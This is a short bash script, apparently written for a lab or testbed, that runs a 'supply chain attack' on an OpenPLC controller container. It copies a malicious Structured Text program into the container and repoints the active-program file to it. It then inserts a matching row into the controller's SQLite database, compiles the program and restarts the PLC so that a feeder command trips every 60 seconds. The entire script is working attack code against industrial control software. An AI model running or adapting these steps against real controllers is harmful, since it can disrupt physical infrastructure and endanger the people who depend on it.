#!/bin/bash
echo "[*] Initiating Shadow Garden Supply Chain Attack..."

# 1. Push the malicious payload to the persistent directory
podman cp ./engineering_malicious/malicious.st openplc_shadow:/docker_persistent/st_files/malicious.st

# 2. Modify the pointer file to target the malicious payload
podman exec openplc_shadow bash -c "echo 'malicious.st' > /docker_persistent/active_program"

# Inject malicious program into SQL database to prevent webserver crash
podman exec openplc_shadow python3 -c \
    "import sqlite3; conn = sqlite3.connect('/docker_persistent/openplc.db'); cur = conn.cursor(); cur.execute(\"INSERT OR REPLACE INTO Programs (Prog_ID, Name, Description, File, Date_upload) VALUES (19, 'malicious', 'Malicious program', 'malicious.st', 1527184953)\"); conn.commit(); conn.close()"

# 3. Compile the program inside the container to build the new runtime binary
echo "[*] Compiling malicious program inside container..."
podman exec openplc_shadow bash -c "cd /workdir/webserver && ./scripts/compile_program.sh malicious.st"

# 4. Force a hardware restart to load the new logic
echo "[*] Triggering PLC restart..."
podman stop openplc_shadow
sleep 2
podman start openplc_shadow

echo "[+] Payload Deployed. FEEDER_3_CMD will now trip every 60 seconds."